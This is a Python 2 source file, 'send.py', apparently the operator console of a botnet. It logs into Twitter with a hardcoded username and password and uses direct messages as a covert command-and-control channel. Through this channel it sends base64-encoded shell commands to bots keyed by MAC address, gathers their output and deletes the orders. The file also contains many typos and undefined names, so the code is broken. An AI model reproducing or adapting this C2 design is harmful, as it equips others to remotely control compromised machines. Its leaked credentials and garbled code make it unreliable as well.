# -*- coding: utf-8 -*-
# send.py
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import json
import base64
import random
import requests
import sys
import string
import time

SESSION = reqeusts.Session()
RESPONSE = ""
AUTH_TOKEN = ""
USERNAME = "ShuntoMizushima"
PASSWORD = "mizushiam4105"
DM_LINK = "https://twitter.com/messages/with/conversation?id=796359178117750785-796359178117750785&last_note_ts=3"
WAIT_TIME = 120
BOTS_ALIVE = []
BOTS_MACADDR = []
COMMANDS = []
JOB_LIST = []

class CommandToExcecute:
    def __init__(self, message):
        try:
             data = json.loads(base64.b64decode(message))           
             self.data = data
             self.sender = data['sender']
             self.receiver = data['receiver']
             self.output = data['output']
             self.cmd = data['cmd']
             self.jobid = data['jobid']
         except:
             sys.exit()
             
    def retrieve_command(self):
        return self.jobid, self.cmd
          
class CommandToSend:
    def __init__(self, sender, receiver, cmd):
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(random.sample(string.ascii_letters + string.digits, 7))
    
    def build(self):
        cmd = {'sender':self.sender,
                'reciever':self.receiver,
                'cmd':self.cmd,
                'jobid':self.jobid
        }
        return base64.b64encode(json.dumps(cmd))

    def get_jobid(self):
        return self.jobid

class CommandOutput:
    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            pass

    def get_jobid(self):
        return self.jobid

    def get_sender(self):
        return self.sender

    def get_reciever(self):
        return self.receiver

    def get_cmd(self):
        reutrn self.cmd

    def get_output(self):
        return self.output

def dm_delete():
    global SESSION, RESPONSE, AUTH_TOKEN, JOB_LIST, BOTS_ALIVE, COMMANDS
    
    headers = {
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding":"gzip, deflate, sdch, br",
        "Accept-Language":"ja,en-US;q=0.8,en;q=0.6",
        "User-Agent":"Mozilla/5.0",
        "Referer":"https://twitter.com/",
        "X-Requested-With":"XMLHttpRequest"
    }                                                              

    delete = {
        "authenticity_token":AUTH_TOKEN,
        "conversation_id":"",
        "cursor":"GRwmgICg7bSb-OYYFoCAoO20m_jmGCUAAAA",
        "id":""
    }

    try:
        delete['authenticity_token'] = AUTH_TOKEN
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print "[+] Failed to get the direct message."
        login()
        sys.exit()

    dm = dm.json()

    items = dm['items']

    del_count = 0
    for line in dm['items']:
        try:
            soup = BeautifulSoup(items[line], 'lxml')
            delete['id'] = soup.find('div', attrs={'class':'DirectMessage'}).get('data-item-id')
            del_count == 1
        except:
            pass
    print "[+] Deleted %d orders." % del_count

def dm_receive():
    global SESSION, RESPONSE, AUTH_TOKEN, JOB_LIST, BOTS_ALIVE, COMMANDS, BOTS_MACADDR
    COMMANDS = []

    headers = {
        "Accept":"application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding":"gzip, deflate, sdch, br",
        "Accept-Language":"ja,en-US;q=0.8,en;q=0.6",
        "User-Agent":"Mozilla/5.0",
        "Referer":"https://twitter.com/",
        "X-Requested-With":"XMLHttpRequest"
    }

    try:
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print "[+] Failed to get the direct message."
        login()
        sys.exit()

    dm = dm.json()
    items = dm['items']
    for line in dm['items']:
        try:
            soup = BeautifulSoup(items[line], 'lxml')
            message = soup.find('p', attrs={'class':'tweet-text'}).string
            message = CommandOutput(message)
            jobid = message.get_jobid()
            cmd = message.get_cmd()
            if (jobid in JOB_LIST and cmd == "PING"):
                list_bots_macaddr = "".join(BOTS_MACADDR)
                flag = list_bots_macaddr.find(message.get_sender())
                if flag != -1:
                    pass
                else:
                    BOTS_MACADDR.append(message.get_sender())
                    BOTS_ALIVE.append(message)
            elif (jobid not in JOB_LIST):
                COMMNANDS.append(message)
        except:
            pass
    print "[+] Updated the information of bots."
    print "[+] Current bots:%d" % len(BOTS_MACADDR)
    print "[+] Current number of the commands:%d" % len(COMMANDS)
             
def dm_send(message):
    global SESSION, RESPONSE, AUTH_TOKEN
                                
    headers = {
        "User-Agent":"Mozilla/5.0",
        "referer":"https://twitter.com/"
    }
                                                                                                                          
    send = {
        "authenticity_token":AUTH_TOKEN,
        "conversation_id":"796359178117750785-796359178117750785",
        "scribeContect[component]":"tweet_box_dm",
        "tagged_users":"",
        "text":message,
        "tweetboxId":"swift_tweetbox_1501732327386"
    } 
                                                                                                                          
    try:
        RESPONSE = SESSION.post('https://twitter.com/i/direct_messages/new', data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
                                                                                                                          
        if RESPONSE.status_code == 200:
            print "[+] Completed sending the message, HTTP Status code: %d" % RESPONSE.status_code
        else:
            print "[+] Failed to send the message, HTTP Status code: %d" % RESPONSE.status_code
    except:
        print "[+] An error occurred while sending the message."

def login():
    global SESSION, RESPONSE, AUTH_TOKEN
                                                                                                                    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://twitter.com/",
        "Origin": "https://twitter.com",
        "Upgrade-insecure-requests": "1"
    }
                                                                                                                   
    login = {
        "session[username_or_email]": "",
        "sesssion[password]": "",
        "remember_me": "1",
        "return_to_ssl": "",
        "redirect_after_login": "/",
        "scribe_log": "",
        "authenticity_token":""
    }
    
    try: 
        response = SESSION.get('https://twitter.com/', headers=headers, allow_redirects=False)
        soup = BeautifulSoup(response.text, "lxml")
        AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
    except ConnectionError:
        print "[*] Can't connect to Twitter."
        sys.exit()
                                                                                                                   
    login['authenticity_token'] = AUTH_TOKEN
                                                                                                                   
    try:
        login = SESSION.post(session_url, headers=headers, data=payload, allow_redirects=False)
        if login.status_code == 302 or login.status_code == 200:
            print "[+] Loggined successfully, HTTP Status Code: %d" % login.status_code
        else:
            print "[+] Failed to loggin, HTTP Status Code: %d" % login.status_code
        
    except:
        "[+] An error occurred in the middle of the login."

def refresh():
    global JOB_LIST, WAIT_TIME
    print '[+] Creating the orders to check running bots.'
    cmd = CommandToSend('master', 'master', 'PING')
    dm_send(cmd.build())
    time.sleep(WAIT_TIME)
    dm_recieve()
    JOB_LIST.append(cmd.get_jobid())

def list_bots():
    if (len(BOTS_ALIVE) == 0):
        print "[+] No bots alive"
        return 
    for bot in BOTS_ALIVE:
        print "%s: %s" % (bot.get_sender(), bot.get_output())

def list_commands():
    if (len(COMMANDS) == 0):
        print "[+] No commands loaded"
        return 
    for command in COMMANDS:
        print "%s: '%s' on %s" % (command.get_jobid(), command.get_cmd(), command.get_sender())

def retrieve_command(id_command):
    for command in COMMANDS:
        if (command.get_jobid() == id_command):
            print "%s: %s" % (command.get_jobid(), commad.get_output())
            return 
    print "[+] Did not manage to retrieve the output."

def help():
    pirnt """
    refresh                  - Update the runnning bots and the command results
    reload                   - Update the command results
    list_bots                - The list of running bots
    list_commands            - The list of the ordered commands 
    !retrieve <jobid>        - Show the result of the order command
    !cmd <MAC ADDRESS>       - Send the order to the bot
    delete                   - Delete all orders
    help                     - Show help
    exit                     - Stop the program
    """
def main():
    login()
    refresh()
    while True:
        cmd_to_launch = raw_input('$ ')
        if (cmd_to_launch == 'refresh'):
            refresh()
        if (cmd_to_launch == 'reload'):
            dm_receive()
        elif (cmd_to_launch == 'list_bots'):
            list_bots()
        elif (cmd_to_launch == 'list_commands'):
            list_commands()
        elif (cmd_to_launch == 'delete'):
            dm_delete()
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'exit'):
            sys.exit(0)
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == "!cmd"):
                cmd = CommandToSend('master', cmd_to_launch[1], ' '.join(cmd_to_launch[2:]))
                dm_send(cmd.build())
                print '[+] Sent command "%s" with jobid: %s' % (' '.join(cmd_to_launch[2:]), cmd.get_jobid())
            elif (cmd_to_launch[0] == "!retrieve");
                retrieve_command(cmd_to_launch[1])
            else:
                print "[!] Unrecognized command"

if __name__ == '__main__':
    main()
